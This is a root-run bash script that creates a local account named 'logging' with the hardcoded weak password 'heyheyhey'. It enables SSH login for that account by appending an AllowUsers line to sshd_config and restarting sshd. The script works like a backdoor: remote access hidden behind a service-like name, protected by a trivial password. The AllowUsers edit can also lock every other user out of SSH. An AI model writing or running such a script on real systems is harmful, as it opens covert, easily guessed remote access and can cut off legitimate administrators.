#!/bin/bash

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo "Error: This script must be run as root." >&2
    exit 1
fi

# Set the password variable
PASSWORD="heyheyhey"

# Check if the user already exists
if id "logging" &>/dev/null; then
    echo "User 'logging' already exists. Skipping user creation."
else
    # Create the 'logging' user
    useradd -m -s /bin/bash logging

    # Set the password for the 'logging' user
    echo "logging:$PASSWORD" | chpasswd

    echo "User 'logging' created and password set."
fi

# Allow the 'logging' user to SSH into the system
mkdir -p /home/logging/.ssh
chown logging:logging /home/logging/.ssh
chmod 700 /home/logging/.ssh

# Optionally, you can add an SSH key for the 'logging' user
# echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAr..." > /home/logging/.ssh/authorized_keys
# chown logging:logging /home/logging/.ssh/authorized_keys
# chmod 600 /home/logging/.ssh/authorized_keys

# Ensure the 'logging' user is allowed in the sshd_config
SSHD_CONFIG="/etc/ssh/sshd_config"
if ! grep -q "^AllowUsers.*\blogging\b" "$SSHD_CONFIG"; then
    echo "AllowUsers logging" >> "$SSHD_CONFIG"
    echo "Updated sshd_config to allow user 'logging'."
fi

# Restart the SSH service to apply changes
systemctl restart sshd

echo "User 'logging' is now allowed to SSH into the system."